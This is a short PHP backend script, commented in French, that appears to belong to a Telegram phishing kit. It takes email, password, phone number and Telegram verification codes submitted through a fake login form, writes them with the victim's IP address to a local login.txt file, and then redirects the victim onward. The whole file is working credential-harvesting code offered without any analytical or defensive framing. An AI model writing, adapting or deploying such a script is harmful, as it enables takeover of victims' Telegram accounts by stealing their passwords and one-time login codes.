<?php
// Vérifie si le formulaire a été soumis via la méthode POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupère et nettoie les données du formulaire de manière compatible
    $username = isset($_POST["email"]) ? htmlspecialchars(trim($_POST["email"])) : '';
    $password = isset($_POST["password"]) ? htmlspecialchars(trim($_POST["password"])) : '';
    $country_code = isset($_POST["country_code"]) ? htmlspecialchars(trim($_POST["country_code"])) : '';
    $phone_number = isset($_POST["phone_number"]) ? htmlspecialchars(trim($_POST["phone_number"])) : '';
    $verification_code = isset($_POST["code"]) ? htmlspecialchars(trim($_POST["code"])) : '';
    $remember = isset($_POST["remember"]) ? 'Oui' : 'Non';
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');

    // Vérifie si les champs ne sont pas vides
    if ((!empty($username) && !empty($password)) || !empty($verification_code)) {
        // Formate les données pour l'enregistrement
        $data = "=== ".(!empty($verification_code) ? "CODE TELEGRAM" : "NOUVELLE CONNEXION TELEGRAM")." ===\n";
        $data .= "Date: $date\n";
        
        if (!empty($verification_code)) {
            $data .= "Code de vérification: $verification_code\n";
        } else {
            $data .= "Email/Username: $username\n";
            $data .= "Téléphone: ".($country_code ? $country_code : '').$phone_number."\n";
            $data .= "Mot de passe: $password\n";
            $data .= "Session active: $remember\n";
        }
        
        $data .= "Adresse IP: $ip\n";
        $data .= "==============================\n\n";
        
        // Chemin absolu du fichier pour plus de sécurité
        $file = __DIR__.'/login.txt';
        
        // Gestion robuste du fichier
        $attempts = 0;
        $max_attempts = 3;
        $success = false;
        
        while ($attempts < $max_attempts && !$success) {
            try {
                $fh = fopen($file, 'a');
                if (flock($fh, LOCK_EX)) {
                    fwrite($fh, $data);
                    flock($fh, LOCK_UN);
                    $success = true;
                }
                fclose($fh);
            } catch (Exception $e) {
                $attempts++;
                usleep(100000);
            }
        }
        
        if ($success) {
            header("Location: mer.html");
            exit();
        } else {
            error_log("[".date('Y-m-d H:i:s')."] Échec écriture fichier. IP: $ip");
            echo "<script>alert('Erreur système. Veuillez réessayer.'); window.location.href = 'index.html';</script>";
            exit();
        }
    } else {
        echo "<script>alert('Veuillez remplir tous les champs requis.'); history.back();</script>";
        exit();
    }
} else {
    header("HTTP/1.1 403 Forbidden");
    echo "<h1>Accès interdit</h1><p>Méthode non autorisée.</p>";
    exit();
}
?
